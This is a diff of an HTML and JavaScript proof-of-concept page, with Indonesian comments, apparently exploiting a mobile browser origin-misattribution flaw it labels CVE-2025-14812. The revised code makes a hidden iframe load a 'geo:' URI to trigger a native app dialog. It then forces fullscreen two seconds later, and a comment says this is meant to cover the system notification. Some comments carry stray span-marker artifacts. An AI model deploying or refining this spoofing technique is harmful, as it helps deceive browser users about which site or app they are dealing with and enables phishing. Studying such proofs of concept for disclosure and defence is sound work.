@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>CVE-2025-14812 Inspired PoC with Delayed Fullscreen</title>
+    <title>CVE-2025-14812 Inspired PoC with Dialog & Delayed Fullscreen</title>
     <style>
       body, html {
         margin: 0;
@@ -53,15 +53,20 @@
       let statusInfo = document.getElementById("statusInfo");
 
       execButton.onclick = function () {
-        statusInfo.innerText = "Status: Initializing sequence. Waiting 2 seconds for Fullscreen...";
+        statusInfo.innerText = "Status: Deploying subframe origin context & triggering dialog...";
         this.style.display = "none";
 
-        // Menggunakan setTimeout 2 detik (2000ms) sebelum memicu fullscreen dan subframe
-        setTimeout(() => {
-          try {
-            statusInfo.innerText = "Status: Entering fullscreen & deploying origin context...";
+        try {
+          // 1. Langsung memicu sub-frame URI-scheme untuk memunculkan dialog aplikasi (Maps/Grab) saat tombol ditekan[span_0](start_span)[span_0](end_span)
+          let spoofFrame = document.createElement("iframe");
+          spoofFrame.style.display = "none";
+          spoofFrame.src = "geo:0,0?q=apple.com";
+          document.body.appendChild(spoofFrame);
 
-            // Meminta mode Fullscreen setelah jeda waktu 2 detik
+          statusInfo.innerText = "Status: Dialog triggered. Entering fullscreen in 2 seconds...";
+
+          // 2. Berpindah ke mode Fullscreen secara otomatis setelah jeda 2 detik untuk menutupi notifikasi sistem
+          setTimeout(() => {
             let docElement = document.documentElement;
             if (docElement.requestFullscreen) {
               docElement.requestFullscreen().catch((err) => {
@@ -70,23 +75,13 @@
             } else if (docElement.webkitRequestFullscreen) { /* Safari / Mobile Webkit */
               docElement.webkitRequestFullscreen();
             }
+            statusInfo.innerText = "Status: Fullscreen active over dialog/notification state.";
+          }, 2000);
 
-            // Membuat elemen iframe tersembunyi untuk memicu misattribution konteks asal 
-            // berdasarkan pola kerentanan penjelajahan seluler (CVE-2025-14812)[span_0](start_span)[span_0](end_span)
-            let spoofFrame = document.createElement("iframe");
-            spoofFrame.style.display = "none";
-            
-            // Mengarahkan sub-frame ke skema URI non-HTTP atau domain target simulasi
-            spoofFrame.src = "geo:0,0?q=apple.com";
-            
-            document.body.appendChild(spoofFrame);
-            statusInfo.innerText = "Status: Fullscreen active. Subframe URI-scheme dispatched.";
-
-          } catch (err) {
-            statusInfo.innerText = "Status: Execution error: " + err.message;
-            execButton.style.display = "block";
-          }
-        }, 2000); // Penundaan selama 2 detik
+        } catch (err) {
+          statusInfo.innerText = "Status: Execution error: " + err.message;
+          execButton.style.display = "block";
+        }
       };
     </script>
   </body>
